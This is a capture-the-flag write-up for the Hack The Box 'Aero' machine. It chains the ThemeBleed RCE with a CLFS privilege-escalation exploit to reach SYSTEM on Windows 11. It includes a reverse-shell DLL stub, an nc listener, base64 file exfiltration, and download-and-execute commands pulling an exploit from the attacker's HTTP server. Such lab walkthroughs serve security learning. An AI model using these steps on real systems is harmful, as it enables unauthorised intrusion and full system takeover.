🛩️ HTB Aero — Windows 11 | RCE + Privilege Escalation | ThemeBleed + CLFS Exploit

Machine Info:

    Difficulty: Medium

    Platform: Windows

    CVEs: CVE-2023–38146, CVE-2023–28252

🧩 Initial Recon

We begin with an aggressive Nmap scan:

nmap -sVC -p- --min-rate 1000 10.10.11.237

Only port 80 (HTTP) is open, running IIS/10.0 with the X-Powered-By: ARR/3.0 header, indicating that Application Request Routing is enabled (used for load balancing). Navigating to /upload, we find that the server only accepts files with extensions .theme or .themepack.

We successfully upload a dummy aero.theme file, confirming server-side handling of theme packages.
🔥 ThemeBleed RCE (CVE-2023–38146)

ThemeBleed is a Windows 11 vulnerability that allows Remote Code Execution via specially crafted .theme files pointing to attacker-controlled SMB shares.

The race condition arises during theme verification:

    The .theme file references a .msstyles file.

    During signature check, Windows closes the DLL after verifying, then reopens it.

    In that gap, an attacker can replace the file with a malicious DLL.

🧪 Proof of Concept Setup

We clone the ThemeBleed PoC:

git clone https://github.com/gabe-k/themebleed

It uses 3 stages:

    stage_1: Triggers version check.

    stage_2: Valid .msstyles to pass signature check.

    stage_3: Malicious DLL that gets executed.

⚙️ Creating a Malicious DLL

Using Visual Studio:

    Create a DLL project.

    Export a VerifyThemeVersion() function that spawns a reverse shell.

int VerifyThemeVersion(void)
{
    rev_shell();
    return 0;
}

The reverse shell connects back to our listener on port 1234. After compiling in Release x64, replace stage_3 in the ThemeBleed repo with our DLL payload.

copy .\x64\Release\payload.dll .\themebleed\data\stage_3

🌐 Exploit Delivery

Generate the theme:

.\ThemeBleed.exe make_theme 10.10.14.150 aero.theme

If the ThemeBleed server fails to start due to existing SMB listeners, stop the Server service and reboot.

Stop-Service -Name Server

Once the service is stopped and the system rebooted, run the PoC server:

.\ThemeBleed.exe server

Upload the crafted aero.theme file and listen using nc -lnvp 1234.

Once triggered, we get a shell as sam.emerson.
🔍 Post Exploitation & Enumeration

We enumerate the user and discover a PowerShell script watchdog.ps1 monitoring for .theme file uploads.

Inside Documents, we find a PDF named CVE-2023-28252_Summary.pdf.

Exfiltration using PowerShell:

[convert]::ToBase64String((Get-Content -path "CVE-2023-28252_Summary.pdf" -Encoding byte))

Decoded locally:

[System.IO.File]::WriteAllBytes("C:\Users\Public\decoded.pdf", [System.Convert]::FromBase64String("<base64>"))

⬆️ Privilege Escalation (CVE-2023-28252)

The PDF gives insight into another recent Windows vulnerability — CLFS EoP (Common Log File System).

We use the Fortra PoC to craft a payload. The default exploit executes notepad.exe; we modify it to spawn a reverse shell.

Important Fix (Visual Studio):
To avoid compilation issues, go to:

Project Properties → Configuration Properties → Advanced → Character Set → Use Multi-Byte Character Set

After building the exploit in Release x64, serve it via a Python HTTP server:

python3 -m http.server 80

On the target, download and execute it:

Invoke-WebRequest -Uri http://10.10.14.150/clfs_eop.exe -OutFile clfs_eop.exe
.\clfs_eop.exe

A new connection is received—this time as NT AUTHORITY\SYSTEM.
🏁 Summary

    Initial Foothold: Exploited ThemeBleed via crafted .theme file + SMB hosting.

    Lateral Movement: Reverse shell as sam.emerson.

    Privilege Escalation: Used CLFS EoP exploit to elevate to SYSTEM.
